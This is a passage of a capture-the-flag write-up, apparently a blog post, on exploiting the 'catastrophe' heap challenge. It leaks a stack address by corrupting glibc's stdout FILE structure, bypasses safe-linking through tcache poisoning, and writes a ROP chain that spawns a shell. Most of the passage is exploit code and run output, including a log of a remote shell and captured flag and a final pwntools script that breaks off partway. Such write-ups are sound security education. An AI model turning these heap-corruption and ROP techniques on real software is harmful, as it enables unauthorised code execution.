	  <span class="o">||</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span> <span class="n">new_do_write</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">==</span> <span class="n">to_do</span><span class="p">)</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">EOF</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_do_write</span><span class="p">,</span> <span class="n">_IO_do_write</span><span class="p">)</span>

<span class="k">static</span> <span class="n">size_t</span>
<span class="n">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">to_do</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">count</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_APPENDING</span><span class="p">)</span>
    <span class="cm">/* On a system without a proper O_APPEND implementation,
</span><span class="cm">       you would need to sys_seek(0, SEEK_END) here, but is
</span><span class="cm">       not needed nor desirable for Unix- or Posix-like systems.
</span><span class="cm">       Instead, just indicate that offset (before and after) is
</span><span class="cm">       unpredictable. */</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
  <span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">!=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span>
	<span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
	    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">new_pos</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSWRITE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">to_do</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">&amp;&amp;</span> <span class="n">count</span><span class="p">)</span>
    <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">=</span> <span class="n">_IO_adjust_column</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_cur_column</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">count</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
  <span class="n">_IO_setg</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span> <span class="o">=</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span>
		       <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span> <span class="o">|</span> <span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
		       <span class="o">?</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="nl">_IO_buf_base</span> <span class="p">:</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">count</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div><p>To avoid the <code>_IO_SYSSEEK</code> which could break stdout, we can add <code>_IO_IS_APPENDING</code> to <code>fp-&gt;_flags</code>. Then <code>_IO_SYSWRITE</code> is called and prints <code>(_f)-&gt;_IO_write_ptr-(_f)-&gt;_IO_write_base</code> bytes from <code>(_f)-&gt;_IO_write_base</code> to stdout. But that&rsquo;s not finished, right after we got the stack leak <code>new_do_write</code> initializes the output / input buffer to <code>_IO_buf_base</code> except for the output buffer which is initialized to <code>_IO_buf_end</code> (<code>_IO_LINE_BUF</code> not present). Thus we have to make <code>fp-&gt;_IO_buf_base</code> and <code>fp-&gt;_IO_buf_end</code> equal to valid writable pointers.</p>
<p>Thus we just need to:</p>
<ul>
<li><code>fp-&gt;_flags</code> = (<code>fp-&gt;_flags</code> &amp; ~(<code>_IO_NO_WRITES</code>)) | <code>_IO_CURRENTLY_PUTTING</code> | <code>_IO_IS_APPENDING</code>.</li>
<li><code>f-&gt;_IO_write_ptr</code> = <code>fp-&gt;_IO_write_end</code> = <code>f-&gt;_IO_buf_end</code> = <code>&amp;environ + 8</code>.</li>
<li><code>fp-&gt;_IO_write_base</code> = <code>&amp;environ</code>.</li>
</ul>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> 
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _flags</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="c1"># _IO_read_*</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_write_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="c1"># _IO_write_ptr + _IO_write_end</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _IO_buf_base</span>
    <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="c1"># _IO_buf_end</span>
    <span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> 

<span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span> 
<span class="c1"># Offset of the saved rip that belongs to frame of the op_malloc function</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="ropchain">
        ROPchain
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#ropchain" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor ROPchain" href="#ropchain">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Now we leaked the stack address we finally just need to achieve another arbitrary write to craft the ROPchain onto the <code>op_malloc</code> function that writes the user input into the requested chunk.</p>
<p>To get the arbitrary write we just have to use the same overlapping chunks technique than last time, let&rsquo;s say we wanna write to <code>target</code> and we have <code>prev</code> that overlaps <code>victim</code>:</p>
<ul>
<li><code>free(prev)</code> ends up in the tcachebin (0x140), it has already been consolidated, it <em>already</em> overlaps <code>victim</code>.</li>
<li><code>free(victim)</code> ends up in the tcachebin (0x110).</li>
<li><code>malloc(0x130)</code> returns <code>prev</code>, thus we can corrupt <code>victim-&gt;next</code> and intialize it to <code>(target ^ ((chunk_location) &gt;&gt; 12)</code> to bypass safe-linking.</li>
<li><code>malloc(0x100)</code> returns <code>victim</code> and tcachebin (0x110) next free chunk is <code>target</code>.</li>
<li><code>malloc(0x100)</code> gives a write what where.</li>
</ul>
<p>When we got the write what where on the stack we simply have to craft a call ot system since there is no <code>seccomp</code> shit.
Here is the script:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># prev</span>
<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># victim</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
<span class="c1"># victim-&gt;next = target</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;TT&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>
<span class="c1"># ROPchain on do_malloc&#39;s stackframe</span>
</code></pre></div><p>And here we are:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>mc.ax <span class="nv">PORT</span><span class="o">=</span><span class="m">31273</span>
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
<span class="o">[</span>+<span class="o">]</span> Opening connection to mc.ax on port 31273: Done
/home/nasm/.local/lib/python3.10/site-packages/pwnlib/tubes/tube.py:822: BytesWarning: Text is not bytes<span class="p">;</span> assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  <span class="nv">res</span> <span class="o">=</span> self.recvuntil<span class="o">(</span>delim, <span class="nv">timeout</span><span class="o">=</span>timeout<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> heap @ 0x559cb0184000
<span class="o">[</span>*<span class="o">]</span> libc: 0x7efe8a967000
<span class="o">[</span>*<span class="o">]</span> environ: 0x7efe8ab88200
<span class="o">[</span>*<span class="o">]</span> stdout: 0x7efe8ab81780
<span class="o">[</span>*<span class="o">]</span> stack: 0x7ffe06420710
<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
$ id
<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span>
$ ls
flag.txt
run
$ cat flag.txt
hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67ad4ed1e<span class="o">}</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h1 id="resources">
        Resources
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#resources" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Resources" href="#resources">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<ul>
<li><a
  class="gblog-markdown__link"
  href="https://a1ex.online/2020/10/01/glibc-IO%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"
  
  >a1ex.online</a
></li>
<li><a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write"
  
  >ray-cp</a
></li>
<li><a
  class="gblog-markdown__link"
  href="http://blog.leanote.com/post/mut3p1g/file-struct"
  
  >Mutepig&rsquo;s Blog</a
></li>
</ul>
<div class="gblog-post__anchorwrap">
    <h1 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/catastrophe/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;catastrophe&#39;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">b* main
</span><span class="s1">source ~/Downloads/pwndbg/gdbinit.py
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
   
   <span class="k">if</span> <span class="n">s</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 
   <span class="k">else</span><span class="p">:</span>
       <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> 

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">view</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span> 
   <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">alloc</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="c1"># then we defeated safe linking lol</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span>

<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">view</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>

<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x219ce0</span> <span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;/bin/sh</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">binsh</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>

<span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span> 
<span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
<span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stdout</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
